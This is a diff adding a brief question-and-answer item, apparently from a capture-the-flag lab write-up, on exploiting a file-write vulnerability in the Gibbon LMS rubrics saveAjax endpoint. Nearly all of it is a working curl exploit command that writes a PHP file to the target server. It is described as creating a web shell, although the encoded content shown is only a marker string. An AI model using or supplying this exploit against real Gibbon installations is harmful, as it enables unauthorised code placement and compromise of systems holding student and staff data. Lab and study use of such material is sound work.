@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How can you exploit a file write vulnerability in Gibbon?
+
+CONTEXT:
+You have identified the vulnerable saveAjax.php endpoint.
+
+METHOD / ANSWER:
+Command: `curl -d 'img=image/png;0xdf,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001' http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
+Explanation: This command sends a malicious POST request, leveraging the file write vulnerability to create a web shell on the server.
